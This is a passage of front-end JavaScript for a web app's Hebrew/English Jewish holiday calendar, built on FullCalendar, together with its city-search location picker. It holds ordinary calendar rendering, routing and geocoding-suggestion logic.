            'flame': PHOSPHOR_PATHS['flame'],
            'fire': PHOSPHOR_PATHS['fire'],
            'flag': PHOSPHOR_PATHS['flag'],
            'mountains': PHOSPHOR_PATHS['mountains'],
            'flower': PHOSPHOR_PATHS['flower'],
            'leaf': PHOSPHOR_PATHS['leaf'],
            'hourglass': PHOSPHOR_PATHS['hourglass'],
            'star-of-david': PHOSPHOR_PATHS['star-of-david'],
        };
        function splitCalendarEmoji(rawTitle) {
            const raw = String(rawTitle || '');
            const prefix = (/^[^\p{L}\p{N}]+/u.exec(raw) || [''])[0];
            if (!prefix.trim()) return { title: raw.trim(), icon: null };
            const hit = CAL_EMOJI_ICONS.find(([emoji]) => prefix.includes(emoji));
            return { title: raw.slice(prefix.length).trim(), icon: hit ? hit[1] : 'star-of-david' };
        }
        function calendarIconEl(name) {
            const d = CAL_ICON_PATHS[name];
            if (!d) return null;
            const ns = 'http://www.w3.org/2000/svg';
            const svg = document.createElementNS(ns, 'svg');
            svg.setAttribute('viewBox', '0 0 256 256');
            svg.setAttribute('fill', 'currentColor');
            svg.setAttribute('aria-hidden', 'true');
            svg.setAttribute('class', 'cal-event-icon');
            const path = document.createElementNS(ns, 'path');
            path.setAttribute('d', d);
            svg.appendChild(path);
            return svg;
        }

        function fetchCalendarHolidays(year) {
            if (!calendarHolidayCache.has(year)) {
                const request = fetch(`/api/holidays?year=${year}`)
                    .then((r) => {
                        if (!r.ok) throw new Error(`HTTP ${r.status}`);
                        return r.json();
                    })
                    .then((data) => {
                        const items = Array.isArray(data) ? data : (data.items || []);
                        // FullCalendar only exposes non-standard fields via
                        // extendedProps when they're nested there in the source
                        // data — a bare top-level `category` is silently dropped,
                        // not auto-promoted, so eventClass never saw it.
                        return items.map((item) => {
                            const { title, icon } = splitCalendarEmoji(item.title);
                            return {
                                ...item,
                                title,
                                extendedProps: { ...item.extendedProps, category: item.category, detail: item.detail || {}, icon },
                            };
                        });
                    });
                // A failed year may be retried on the next open.
                request.catch(() => calendarHolidayCache.delete(year));
                calendarHolidayCache.set(year, request);
            }
            return calendarHolidayCache.get(year);
        }

        function prefetchCalendar() {
            fetchCalendarHolidays(new Date().getFullYear()).catch(() => {});
        }

        (function wireCalendarPrefetch() {
            const btn = document.querySelector('.home-calendar-btn');
            const warm = () => {
                prefetchCalendar();
                void window.ShelahLibs?.load('fullcalendar');
            };
            ['pointerenter', 'focus', 'touchstart'].forEach((type) => {
                btn?.addEventListener(type, warm, { once: true, passive: true });
            });
        })();

        // Hebcal files every festival, fast, minor and modern day under the one
        // category 'holiday' and says which in detail.subcat -- so colour by the
        // subcat (Shabbat Shuva green, a fast grey, Yom Kippur red) rather than
        // painting all of them holiday-red.
        function calendarVisualCategory(props = {}) {
            const cat = props.category || 'default';
            const sub = String(props.detail?.subcat || '').toLowerCase();
            return cat === 'holiday' && sub ? sub : cat;
        }

        // Holidays red, Shabbat and parashah days green (a Yom Tov on Shabbat
        // stays red). Every Saturday is Shabbat even before events arrive.
        const CAL_HOLIDAY_CATEGORIES = new Set(['major']);
        const CAL_SHABBAT_CATEGORIES = new Set(['shabbat', 'parashat']);
        function computeCalendarDayKinds() {
            const kinds = new Map();
            (holidaysCalendar?.getEvents() || []).forEach((ev) => {
                const cat = calendarVisualCategory(ev.extendedProps);
                let kind = null;
                if (CAL_HOLIDAY_CATEGORIES.has(cat)) kind = 'holiday';
                else if (CAL_SHABBAT_CATEGORIES.has(cat)) kind = 'shabbat';
                if (!kind || !ev.start) return;
                const day = new Date(ev.start);
                do {
                    const key = calendarDateKey(day);
                    if (kinds.get(key) !== 'holiday') kinds.set(key, kind);
                    day.setDate(day.getDate() + 1);
                } while (ev.end && day < ev.end);
            });
            calendarDayKinds = kinds;
        }

        function applyCalendarDayKind(cell) {
            const key = cell?.dataset?.date;
            if (!key) return;
            const kind = calendarDayKinds.get(key) || (cell.classList.contains('fc-day-sat') ? 'shabbat' : null);
            cell.classList.toggle('cal-day-holiday', kind === 'holiday');
            cell.classList.toggle('cal-day-shabbat', kind === 'shabbat');
        }

        function markCalendarDayKinds() {
            document.getElementById('calendar')
                ?.querySelectorAll('.fc-daygrid-day[data-date]')
                .forEach(applyCalendarDayKind);
        }

        function calendarDateKey(d) {
            const pad = (n) => String(n).padStart(2, '0');
            return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`;
        }

        function calendarEventsOn(key) {
            if (!holidaysCalendar) return [];
            return holidaysCalendar.getEvents().filter((ev) => {
                const start = calendarDateKey(ev.start);
                // FullCalendar's end is exclusive; single-day events have none.
                const end = ev.end ? calendarDateKey(ev.end) : null;
                return end ? (start <= key && key < end) : start === key;
            });
        }

        // Highlights the selected day cell. Applied straight to the DOM (and from
        // dayCellDidMount) so month changes and re-renders never lose it; the outline
        // in calendar.css keeps the state visible without relying on colour alone.
        function markCalendarSelectedDay() {
            const calendarEl = document.getElementById('calendar');
            if (!calendarEl) return;
            calendarEl.querySelectorAll('.cal-day-selected').forEach((el) => el.classList.remove('cal-day-selected'));
            if (!calendarSelectedKey) return;
            calendarEl.querySelector(`.fc-daygrid-day[data-date="${calendarSelectedKey}"]`)?.classList.add('cal-day-selected');
        }

        // Plain-object view of a FullCalendar event for the detail card
        // (static/js/calendar-detail.js), so that module never touches FullCalendar.
        function calendarPlainEvent(ev) {
            return {
                key: calendarDateKey(ev.start),
                title: ev.title,
                category: ev.extendedProps.category || 'default',
                detail: ev.extendedProps.detail || {},
            };
        }

        // Opens the Apple-style detail card (popover on desktop, sheet on phones)
        // for a day, or straight to `focusEvent` when a specific event was tapped.
        function openCalendarDetail(anchor, key, focusEvent = null) {
            if (!window.ShelahCalendarDetail || !anchor || !holidaysCalendar) return;
            const events = calendarEventsOn(key).map(calendarPlainEvent);
            const tapped = focusEvent
                ? (events.find((e) => e.title === focusEvent.title) ?? calendarPlainEvent(focusEvent))
                : null;
            window.ShelahCalendarDetail.open({
                anchor,
                dateKey: key,
                events,
                allEvents: holidaysCalendar.getEvents().map(calendarPlainEvent),
                event: tapped,
                he: isHebrewMode(),
                // Where the zmanim panel is set, so the card can show real clock times.
                location: window.ShelahModules?.getZmanimLocation?.() ?? null,
                // Tapping a reading (Torah / Haftarah / Maftir) opens that text in the reader.
                openText: openCalendarText,
                bookName: getHebrewBookDisplayName,
            });
        }

        // Leave the calendar (a modal dialog above the reader; closing it closes the card
        // too) and open the text.
        async function openCalendarText(ref) {
            await window.closeCalendarModal();
            void readText(ref);
        }

        function renderCalendarAgenda() {
            const section = document.getElementById('calendarAgenda');
            const list = document.getElementById('calendarAgendaList');
            const heading = document.getElementById('calendarAgendaHeading');
            const hebrew = document.getElementById('calendarAgendaHebrew');
            if (!section || !list || !heading || !calendarSelectedKey) return;

            const [y, m, d] = calendarSelectedKey.split('-').map(Number);
            const date = new Date(y, m - 1, d);
            const he = isHebrewMode();
            heading.textContent = new Intl.DateTimeFormat(he ? 'he-IL' : 'en-US', {
                weekday: 'long', month: 'long', day: 'numeric',
            }).format(date);
            try {
                // "י״ד בתשרי תשפ״ז", not Intl's "14 בתשרי 5787".
                hebrew.textContent = new Intl.DateTimeFormat('he-u-ca-hebrew', {
                    day: 'numeric', month: 'long', year: 'numeric',
                }).formatToParts(date)
                    .map((part) => (part.type === 'day' || part.type === 'year' ? hebrewNumber(part.value) : part.value))
                    .join('');
            } catch {
                hebrew.textContent = '';
            }
            hebrew.hidden = !hebrew.textContent;

            const events = calendarEventsOn(calendarSelectedKey);
            list.replaceChildren();
            if (!events.length) {
                const empty = document.createElement('li');
                empty.className = 'cal-agenda-empty';
                empty.textContent = t('No holidays or special days.', 'אין חגים או ימים מיוחדים.');
                list.appendChild(empty);
            } else {
                events.forEach((ev) => {
                    const li = document.createElement('li');
                    li.className = `cal-agenda-item cal-cat-${calendarVisualCategory(ev.extendedProps)}`;
                    const swatch = document.createElement('span');
                    swatch.className = 'cal-agenda-swatch';
                    swatch.setAttribute('aria-hidden', 'true');
                    const name = document.createElement('span');
                    name.className = 'cal-agenda-title';
                    name.textContent = translateHolidayName(ev.title);
                    // A real <button>: keyboard/AT users can open the same detail card.
                    const btn = document.createElement('button');
                    btn.type = 'button';
                    btn.className = 'cal-agenda-btn';
                    const icon = calendarIconEl(ev.extendedProps.icon);
                    btn.append(...[swatch, icon, name].filter(Boolean));
                    btn.addEventListener('click', () => openCalendarDetail(li, calendarSelectedKey, ev));
                    li.classList.add('is-actionable');
                    li.appendChild(btn);
                    list.appendChild(li);
                });
            }
            section.hidden = false;
        }

        function selectCalendarDay(key, { scroll = false, pushUrl = false } = {}) {
            calendarSelectedKey = key;
            markCalendarSelectedDay();
            renderCalendarAgenda();
            if (scroll) {
                document.getElementById('calendarAgenda')?.scrollIntoView({ behavior: scrollBehavior(), block: 'nearest' });
            }
            // Only an explicit user pick (dateClick/eventClick) writes to the
            // URL -- datesSet's auto-reselect on month pagination must not,
            // or paging through months would spam history entries.
            if (pushUrl) {
                window.ShelahRouter?.pushRoute({ date: key }, { replace: true });
            }
        }

        // Self-recovery for the holidays calendar's events fetch: a
        // failed month fetch used to leave the grid showing no events with
        // no indication anything went wrong. One automatic retry, then a
        // visible retry control so it never gets permanently stuck.
        let calendarRetryAttempted = false;

        function clearCalendarLoadError() {
            const el = document.getElementById('calendarLoadError');
            if (!el) return;
            el.classList.add('hidden');
            el.textContent = '';
        }

        function showCalendarLoadError() {
            const el = document.getElementById('calendarLoadError');
            if (!el) return;
            el.classList.remove('hidden');
            el.textContent = '';

            const msg = document.createElement('span');
            msg.textContent = t("Couldn't load this month's holidays.", 'לא ניתן היה לטעון את החגים לחודש זה.');

            const retryBtn = document.createElement('button');
            retryBtn.type = 'button';
            retryBtn.className = 'underline font-semibold ms-1';
            retryBtn.textContent = t('Retry', 'נסה שוב');
            retryBtn.addEventListener('click', () => {
                calendarRetryAttempted = false;
                clearCalendarLoadError();
                if (holidaysCalendar) holidaysCalendar.refetchEvents();
                else ensureCalendarLibrary();
            });

            el.append(msg, retryBtn);
        }

        // FullCalendar 7 renders hashed class names only; these hooks put back
        // the v6 names calendar.css and the code here select on.
        const CALENDAR_WEEKDAY_CLASSES = ['sun', 'mon', 'tue', 'wed', 'thu', 'fri', 'sat'];
        const CALENDAR_CLASS_HOOKS = {
            class: 'fc',
            viewClass: 'fc-view',
            toolbarClass: 'fc-toolbar',
            toolbarTitleClass: 'fc-toolbar-title',
            buttonGroupClass: 'fc-button-group',
            buttonClass: (info) => [
                'fc-button fc-button-primary',
                `fc-${info.name}-button`,
                info.isSelected ? 'fc-button-active' : '',
            ].join(' ').trim(),
            dayHeaderClass: 'fc-col-header-cell',
            dayHeaderInnerClass: 'fc-col-header-cell-cushion',
            // Markers are UTC midnights, so the weekday is the UTC one. The day
            // kind and selection are here too: v7 rebuilds a cell's class list
            // on every re-render (a language switch, say), which wiped the
            // classes applyCalendarDayKind / markCalendarSelectedDay add by hand.
            dayCellClass: (info) => {
                const dow = info.date.getUTCDay();
                const key = info.date.toISOString().slice(0, 10);
                const kind = calendarDayKinds.get(key) || (dow === 6 ? 'shabbat' : null);
                return [
                    'fc-daygrid-day',
                    `fc-day-${CALENDAR_WEEKDAY_CLASSES[dow]}`,
                    info.isToday ? 'fc-day-today' : '',
                    info.isOther ? 'fc-day-other' : '',
                    kind ? `cal-day-${kind}` : '',
                    key === calendarSelectedKey ? 'cal-day-selected' : '',
                ].filter(Boolean).join(' ');
            },
            dayCellTopClass: 'fc-daygrid-day-top',
            dayCellTopInnerClass: 'fc-daygrid-day-number',
            // Backend sends a fixed inline `color` per event (theme-agnostic) plus
            // a `category`; deriving a class from category lets dark-mode CSS
            // recolor events per-category instead of flattening them all to one gray.
            eventClass: (arg) => `fc-event fc-daygrid-event cal-cat-${calendarVisualCategory(arg.event.extendedProps)}`,
            eventInnerClass: 'fc-event-main',
            eventTitleClass: 'fc-event-title',
            popoverClass: 'fc-popover',
        };

        function calendarLanguageOptions() {
            const he = isHebrewMode();
            return {
                direction: he ? 'rtl' : 'ltr',
                todayText: he ? 'היום' : 'Today',
                prevHint: he ? 'החודש הקודם' : 'Previous month',
                nextHint: he ? 'החודש הבא' : 'Next month',
                todayHint: he ? 'עבור להיום' : 'Go to today',
            };
        }

        // v7 sizes every week row from the grid's width (width / aspectRatio / 6),
        // so phones get a taller ratio to keep v6's roomy rows.
        const calendarPhoneQuery = window.matchMedia?.('(max-width: 640px)');
        function calendarAspectRatio() {
            return calendarPhoneQuery?.matches ? 0.75 : 1.7;
        }
        calendarPhoneQuery?.addEventListener?.('change', () => {
            holidaysCalendar?.setOption('aspectRatio', calendarAspectRatio());
        });

        // Grid direction, weekday headers and the month title follow the
        // reader's language; called on a language switch even while closed.
        function syncCalendarLanguage() {
            if (!holidaysCalendar) return;
            const options = calendarLanguageOptions();
            Object.entries(options).forEach(([key, value]) => holidaysCalendar.setOption(key, value));
            holidaysCalendar.render();
        }

        // The day a link or a holiday name asked the calendar to open on before
        // FullCalendar had loaded (gotoCalendarDate).
        let calendarGotoDate = null;

        function gotoCalendarDate(date) {
            if (!holidaysCalendar) {
                calendarGotoDate = date;
                return;
            }
            try { holidaysCalendar.gotoDate(date); } catch { /* pre-render guard */ }
        }

        // FullCalendar comes from window.ShelahLibs (index.html's head) the first
        // time the calendar is wanted; the button's hover/focus/touch starts that
        // early (wireCalendarPrefetch). Builds the calendar once it is there.
        function ensureCalendarLibrary() {
            if (holidaysCalendar) return;
            const calendarEl = document.getElementById('calendar');
            if (window.FullCalendar || !window.ShelahLibs) {
                ensureCalendarReady();
                return;
            }
            calendarEl?.setAttribute('aria-busy', 'true');
            void window.ShelahLibs.load('fullcalendar').then((loaded) => {
                calendarEl?.setAttribute('aria-busy', 'false');
                if (!loaded) {
                    showCalendarLoadError();
                    return;
                }
                ensureCalendarReady();
                if (document.getElementById('calendarModal')?.open) {
                    markCalendarDayKinds();
                    if (calendarSelectedKey) renderCalendarAgenda();
                }
            });
        }

        function ensureCalendarReady() {
            if (holidaysCalendar || !window.FullCalendar) return;
            const calendarEl = document.getElementById('calendar');
            holidaysCalendar = new FullCalendar.Calendar(calendarEl, {
                initialView: 'dayGridMonth',
                ...(calendarGotoDate ? { initialDate: calendarGotoDate } : {}),
                ...calendarLanguageOptions(),
                // FullCalendar 7 shows no toolbar unless asked; this is v6's default.
                headerToolbar: { start: 'title', end: 'today prev,next' },
                ...CALENDAR_CLASS_HOOKS,
                // FullCalendar's global build ships English only; these read
                // the language at render time, so a language switch re-renders
                // them (syncCalendarLanguage).
                // arg.date is a UTC-midnight marker, so formatting it in local
                // time west of UTC names the day before: go by its UTC weekday
                // instead (4 Jan 2026 was a Sunday).
                dayHeaderContent: (arg) => new Intl.DateTimeFormat(isHebrewMode() ? 'he-IL' : 'en-US', { weekday: 'short', timeZone: 'UTC' })
                    .format(new Date(Date.UTC(2026, 0, 4 + arg.date.getUTCDay()))),
                titleFormat: (arg) => new Intl.DateTimeFormat(isHebrewMode() ? 'he-IL' : 'en-US', { month: 'long', year: 'numeric' })
                    .format(new Date(arg.date.year, arg.date.month, 1)),
                // Busy while a month's holidays are on their way (audit §6).
                loading: (isLoading) => calendarEl.setAttribute('aria-busy', isLoading ? 'true' : 'false'),
                events: function (fetchInfo, successCallback, failureCallback) {
                    // A month grid can straddle two years (late Dec / early Jan).
                    const years = new Set([
                        fetchInfo.start.getFullYear(),
                        new Date(fetchInfo.end.getTime() - 1).getFullYear(),
                    ]);
                    // fetchCalendarHolidays() drops a failed year from its cache,
                    // so the refetch below really goes back to the network.
                    Promise.all([...years].map(fetchCalendarHolidays))
                        .then((lists) => {
                            calendarRetryAttempted = false;
                            clearCalendarLoadError();
                            successCallback(lists.flat());
                        })
                        .catch((e) => {
                            if (!calendarRetryAttempted) {
                                calendarRetryAttempted = true;
                                window.setTimeout(() => holidaysCalendar?.refetchEvents(), 3000);
                            } else {
                                showCalendarLoadError();
                            }
                            failureCallback(e);
                        });
                },
                datesSet: function (info) {
                    window.ShelahCalendarDetail?.close({ immediate: true });
                    markCalendarDayKinds();
                    // Near a year boundary, warm the neighbouring year so paging
                    // across Dec/Jan is a cache hit too.
                    const shown = info.view.currentStart;
                    let neighbour = null;
                    if (shown.getMonth() === 0) neighbour = shown.getFullYear() - 1;
                    else if (shown.getMonth() >= 10) neighbour = shown.getFullYear() + 1;
                    if (neighbour) fetchCalendarHolidays(neighbour).catch(() => {});
                    if (_calendarDidMount && window.ShelahMotion) {
                        const harness = calendarEl.querySelector('.fc-view');
                        if (harness) window.ShelahMotion.animateIn(harness, { y: 6 });
                    }
                    _calendarDidMount = true;
                    // Keep the agenda on a day inside the visible month: keep the current
                    // pick if it is still in this month, else today, else the 1st.
                    const monthStart = info.view.currentStart;
                    const inMonth = (key) => key?.slice(0, 7) === calendarDateKey(monthStart).slice(0, 7);
                    const todayKey = calendarDateKey(new Date());
                    let dayKey = calendarDateKey(monthStart);
                    if (inMonth(calendarSelectedKey)) dayKey = calendarSelectedKey;
                    else if (inMonth(todayKey)) dayKey = todayKey;
                    selectCalendarDay(dayKey);
                },
                // Events arrive asynchronously; refresh the agenda when they land.
                eventsSet: function () {
                    computeCalendarDayKinds();
                    markCalendarDayKinds();
                    if (calendarSelectedKey) renderCalendarAgenda();
                },
                dateClick: function (info) {
                    const key = info.dateStr.slice(0, 10);
                    selectCalendarDay(key, { pushUrl: true });
                    openCalendarDetail(info.dayEl, key);
                },
                eventClick: function (info) {
                    info.jsEvent.preventDefault();
                    const key = calendarDateKey(info.event.start);
                    selectCalendarDay(key, { pushUrl: true });
                    openCalendarDetail(info.el, key, info.event);
                },
                // Localize the holiday name shown in month-grid chips (backend sends English only).
                eventContent: function (arg) {
                    return { html: escapeHtml(translateHolidayName(arg.event.title)) };
                },
                // Chips are ellipsised on phones; the native tooltip gives the full name on hover.
                eventDidMount: function (info) {
                    info.el.title = translateHolidayName(info.event.title);
                    const icon = calendarIconEl(info.event.extendedProps.icon);
                    // eventContent above fills the inner wrapper (eventInnerClass).
                    const slot = info.el.querySelector('.fc-event-main');
                    if (icon && slot) slot.prepend(icon);
                },
                dayCellDidMount: function (info) {
                    if (calendarSelectedKey && info.el.dataset.date === calendarSelectedKey) {
                        info.el.classList.add('cal-day-selected');
                    }
                    applyCalendarDayKind(info.el);
                },
                eventColor: '#002147',
                // A row grows past its aspect-ratio height to fit its chips; with
                // dayMaxEvents on, v7 folds them into "+1" links instead.
                dayMaxEvents: false,
                height: 'auto',
                aspectRatio: calendarAspectRatio()
            });
            calendarGotoDate = null;
            holidaysCalendar.render();
            document.getElementById('calendarModal')?.setAttribute('data-calendar-built', '1');
        }

        // Opening the calendar is a history entry of its own (audit U-15,
        // Q6), so a phone's Back closes it: ?date=<the day it opens on>,
        // marked as the calendar overlay. A link or Back/Forward opening it
        // (hydrateCalendarDate) is already on that entry.
        let calendarClosing = null;
        window.openCalendarModal = function ({ fromRoute = false } = {}) {
            const modal = document.getElementById('calendarModal');
            const card = modal.querySelector(':scope > div');
            calendarClosing = null;
            if (!fromRoute && !modal.open && !window.ShelahRouter?.readRoute().date) {
                window.ShelahRouter?.pushRoute({ date: calendarSelectedKey || calendarDateKey(new Date()) }, { overlay: 'calendar' });
            }
            prefetchCalendar();
            // Un-hidden before showModal() so focus can move into the dialog.
            modal.classList.remove('hidden');
            modal.showModal();
            const calScroller = modal.querySelector('.overflow-y-auto');
            if (calScroller) calScroller.scrollTop = 0; // reopen at the top, not wherever it was closed
            // FullCalendar sizes its tables from getBoundingClientRect(), so it
            // must measure the card at rest -- before the entrance puts a scale
            // on it. Measuring mid-entrance (the old 80ms timer) left the grid
            // a fraction of the card's width until something else re-laid it out.
            if (card) card.style.transform = 'none';
            ensureCalendarLibrary();
            markCalendarDayKinds();
            if (calendarSelectedKey) renderCalendarAgenda(); // re-localise if the language changed
            // Fades in like every other window (modalMotion). FullCalendar 7
            // follows the card's size itself (a ResizeObserver), so nothing
            // re-measures it afterwards.
            presentEl(modal, { ...modalMotion(modal), replay: true });
        };

        // Closing steps Back off the calendar's entry when the app pushed it
        // (router closeOverlay), else drops ?date= in place. Resolves once
        // the modal is gone and, after a Back, that entry is off screen --
        // so a text opened from the calendar is pushed from the page under it.
        // The Back's own popstate closes it again (hydrateRoute): that call
        // joins the close under way instead of restarting its fade.
        window.closeCalendarModal = function () {
            if (calendarClosing) return calendarClosing;
            const modal = document.getElementById('calendarModal');
            window.ShelahCalendarDetail?.close({ immediate: true });
            const router = window.ShelahRouter;
            let steppedBack = null;
            if (router?.readRoute().date && router.closeOverlay('calendar', { date: null }) === 'back') {
                steppedBack = new Promise((resolve) => {
                    window.addEventListener('popstate', resolve, { once: true });
                    window.setTimeout(resolve, 500);
                });
            }
            const dismissed = dismissEl(modal, {
                ...modalMotion(modal),
                onHidden: () => { if (modal.open) modal.close(); },
            });
            const closing = (steppedBack === null ? Promise.resolve(dismissed) : Promise.all([dismissed, steppedBack]))
                .finally(() => { if (calendarClosing === closing) calendarClosing = null; });
            calendarClosing = closing;
            return closing;
        };

        // <dialog> closes on Escape natively; keep that path routed through
        // closeCalendarModal() (not the raw native close) so the 'hidden'
        // class toggle always runs -- this modal previously had no
        // Escape-to-close at all, so this keeps that same single code path
        // as the only way it closes, just adding Escape as a trigger for it.
        document.getElementById('calendarModal')?.addEventListener('cancel', function (e) {
            e.preventDefault();
            closeCalendarModal();
        });

        document.getElementById('calendarModal')?.addEventListener('click', function (e) {
            if (e.target === this) {
                closeCalendarModal();
            }
        });

        // Opens the calendar overlay directly on a ?date= deep link. Called
        // from hydrateRoute on load/back-forward, so it must not itself push
        // a new URL entry (selectCalendarDay's default pushUrl: false).
        function hydrateCalendarDate(dateKey) {
            if (!/^\d{4}-\d{2}-\d{2}$/.test(String(dateKey || ''))) return;
            window.openCalendarModal({ fromRoute: true });
            const [y, m, d] = dateKey.split('-').map(Number);
            gotoCalendarDate(new Date(y, m - 1, d));
            selectCalendarDay(dateKey, { scroll: true });
        }

        // Same date-jump as hydrateCalendarDate, but for a fresh user click
        // (the "Holiday Season" home widget's holiday name) rather than a
        // ?date= route already in the URL: openCalendarModal() here (not
        // {fromRoute: true}) pushes its own history entry, which
        // selectCalendarDay's pushUrl:true then corrects in place to this
        // date instead of leaving it on whatever was last selected.
        function openCalendarOnDate(dateKey) {
            if (!/^\d{4}-\d{2}-\d{2}$/.test(String(dateKey || ''))) return;
            window.openCalendarModal();
            const [y, m, d] = dateKey.split('-').map(Number);
            gotoCalendarDate(new Date(y, m - 1, d));
            selectCalendarDay(dateKey, { scroll: true, pushUrl: true });
        }

        function openTodayInCalendar() {
            openCalendarOnDate(calendarDateKey(new Date()));
        }

        // ─── City Location Search ─────────────────────────────────
        let citySearchOpen = false;

        window.openCitySearch = function () {
            const popover = document.getElementById('citySearchPopover');
            const btn = document.getElementById('citySearchBtn');
            if (!popover || !btn) return;

            citySearchOpen = !citySearchOpen;
            if (citySearchOpen) {
                // Position below the button
                const rect = btn.getBoundingClientRect();
                const sectionRect = btn.closest('.home-today-section').getBoundingClientRect();
                popover.style.top = (rect.bottom - sectionRect.top + 6) + 'px';
                presentEl(popover, { preset: 'popover', origin: btn });
                setTimeout(() => document.getElementById('citySearchInput')?.focus(), 50);
            } else {
                dismissEl(popover, { preset: 'popover' });
            }
        };

        function closeCitySearchPopover() {
            citySearchOpen = false;
            clearCitySuggestions();
            dismissEl(document.getElementById('citySearchPopover'), { preset: 'popover' });
        }

        // Sets the zmanim location the city box found, for this visit and the session.
        function applyCityLocation(location, shortName) {
            const statusEl = document.getElementById('citySearchStatus');
            if (!window.ShelahModules?.fetchZmanimAPI) {
                throw new Error('Zmanim module unavailable');
            }
            window.ShelahModules.cacheZmanimLocation(location);

            // Update server session
            fetch('/set_location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(location)
            }).catch(() => { });

            // Fetch new zmanim
            window.ShelahModules.fetchZmanimAPI(location, buildZmanimDeps());
            window.ShelahModules.setCurrentZmanimLocationLabel(shortName);

            statusEl.classList.remove('hidden');
            statusEl.textContent = `${t('Using:', 'משתמש ב:')} ${shortName}`;
            setTimeout(closeCitySearchPopover, 1200);
        }

        window.searchByCity = async function () {
            const input = document.getElementById('citySearchInput');
            const errorEl = document.getElementById('citySearchError');
            const statusEl = document.getElementById('citySearchStatus');
            const submitBtn = document.getElementById('citySearchSubmit');
            if (!input) return;

            const city = input.value.trim();
            if (!city) return;

            errorEl.classList.add('hidden');
            statusEl.classList.remove('hidden');
            statusEl.textContent = t('Searching...', 'מחפש...');
            submitBtn.disabled = true;

            try {
                const url = `/api/geocode?q=${encodeURIComponent(city)}&lang=${isHebrewMode() ? 'he' : 'en'}`;
                const res = await fetch(url);
                const payload = await res.json();
                const results = payload?.results;

                if (!res.ok) {
                    errorEl.textContent = t('Search failed. Please try again shortly.', 'החיפוש נכשל. נסה שוב בקרוב.');
                    errorEl.classList.remove('hidden');
                    statusEl.classList.add('hidden');
                    return;
                }

                if (!results || results.length === 0) {
                    errorEl.textContent = t('City not found. Try a different spelling.', 'העיר לא נמצאה. נסה איות אחר.');
                    errorEl.classList.remove('hidden');
                    statusEl.classList.add('hidden');
                    return;
                }

                const { lat, lon, display_name } = results[0];
                const location = { lat: Number.parseFloat(lat), lon: Number.parseFloat(lon) };
                // Show short city name in location label
                const shortName = display_name.split(',').slice(0, 2).map((part) => part.trim()).join(', ');
                applyCityLocation(location, shortName);

            } catch {
                errorEl.textContent = t('Search failed. Check your connection.', 'החיפוש נכשל. בדוק את החיבור שלך.');
                errorEl.classList.remove('hidden');
                statusEl.classList.add('hidden');
            } finally {
                submitBtn.disabled = false;
            }
        };

        // ── Places as the reader types ──────────────────────────────────────
        // /api/geocode/suggest answers each pause in typing with up to six places,
        // each with its time zone; a country with several zones ("United States")
        // comes back as one city per zone. The zone the reader's own clock is in
        // goes first. The top place's name is filled in after what was typed
        // (selected, so the next letter replaces it), and Enter takes the
        // highlighted place, or the top one.
        const CITY_SUGGEST_DELAY_MS = 150;
        const citySuggest = { items: [], active: -1, serial: 0, timer: 0, abort: null, queued: null, inflight: null };

        function readerTimeZone() {
            try {
                return Intl.DateTimeFormat().resolvedOptions().timeZone || '';
            } catch {
                return '';
            }
        }

        // "GMT-5" for a zone, or '' where the browser cannot say.
        function zoneOffsetLabel(timeZone) {
            if (!timeZone) return '';
            try {
                const parts = new Intl.DateTimeFormat('en-US', { timeZone, timeZoneName: 'shortOffset' }).formatToParts(new Date());
                return parts.find((part) => part.type === 'timeZoneName')?.value || '';
            } catch {
                return '';
            }
        }

        function foldPlaceName(text) {
            return String(text || '').normalize('NFD').replace(/[̀-ͯ]/g, '').toLowerCase();
        }

        // The reader's own zone first, marked, when the list is a country's zones:
        // the same zone name, or else the first zone whose clock reads the same now
        // (America/Toronto for a reader on America/New_York).
        function orderCitySuggestions(items) {
            const own = readerTimeZone();
            const zones = items.filter((item) => item.kind === 'zone' && own);
            let mine = zones.filter((item) => item.timezone === own);
            if (!mine.length) {
                const ownOffset = zoneOffsetLabel(own);
                mine = zones.filter((item) => ownOffset && zoneOffsetLabel(item.timezone) === ownOffset).slice(0, 1);
            }
            if (!mine.length) return items;
            return [...mine.map((item) => ({ ...item, yours: true })), ...items.filter((item) => !mine.includes(item))];
        }

        function cityOptionId(index) {
            return `cityOption-${index}`;
        }

        function cityShortName(item) {
            const region = String(item.detail || '').split(',')[0].trim();
            return region ? `${item.name}, ${region}` : item.name;
        }

        function renderCitySuggestions() {
            const list = document.getElementById('citySuggestList');
            const input = document.getElementById('citySearchInput');
            const statusEl = document.getElementById('citySuggestStatus');
            if (!list || !input) return;
            const { items, active } = citySuggest;
            list.setAttribute('aria-label', t('Matching places', 'מקומות מתאימים'));
            list.innerHTML = items.map((item, index) => {
                const offset = zoneOffsetLabel(item.timezone);
                const detail = [item.detail, offset].filter(Boolean).map(escapeHtml).join(' · ');
                const yours = item.yours
                    ? `<span class="city-suggest-badge">${escapeHtml(t('Your time zone', 'אזור הזמן שלך'))}</span>`
                    : '';
                return `<li role="option" id="${cityOptionId(index)}" data-index="${index}" class="city-suggest-item"
                    aria-selected="${index === active ? 'true' : 'false'}">
                    <span class="city-suggest-name">${escapeHtml(item.name)}${yours}</span>
                    <span class="city-suggest-detail">${detail}</span>
                </li>`;
            }).join('');
            const open = items.length > 0;
            list.classList.toggle('hidden', !open);
            input.setAttribute('aria-expanded', open ? 'true' : 'false');
            if (active >= 0 && open) {
                input.setAttribute('aria-activedescendant', cityOptionId(active));
                document.getElementById(cityOptionId(active))?.scrollIntoView?.({ block: 'nearest' });
            } else {
                input.removeAttribute('aria-activedescendant');
            }
            if (statusEl) {
                statusEl.textContent = open
                    ? t(`${items.length} places`, `${items.length} מקומות`)
                    : '';
            }
        }

        function clearCitySuggestions() {
            citySuggest.serial += 1;
            citySuggest.abort?.abort();
            citySuggest.abort = null;
            clearTimeout(citySuggest.timer);
            citySuggest.queued = null;
            citySuggest.inflight = null;
            citySuggest.items = [];
            citySuggest.active = -1;
            renderCitySuggestions();
        }

        // Fills in the rest of the top place's name after what was typed, selected.
        function completeCityInput(input, typed) {
            const top = citySuggest.items[0];
            if (!top || input.value !== typed || document.activeElement !== input) return;
            const name = String(top.name || '');
            if (!typed || name.length <= typed.length || !foldPlaceName(name).startsWith(foldPlaceName(typed))) return;
            input.value = typed + name.slice(typed.length);
            input.setSelectionRange(typed.length, input.value.length);
        }

        async function fetchCitySuggestions(typed, complete) {
            const serial = ++citySuggest.serial;
            citySuggest.abort?.abort();
            const controller = typeof AbortController === 'function' ? new AbortController() : null;
            citySuggest.abort = controller;
            try {
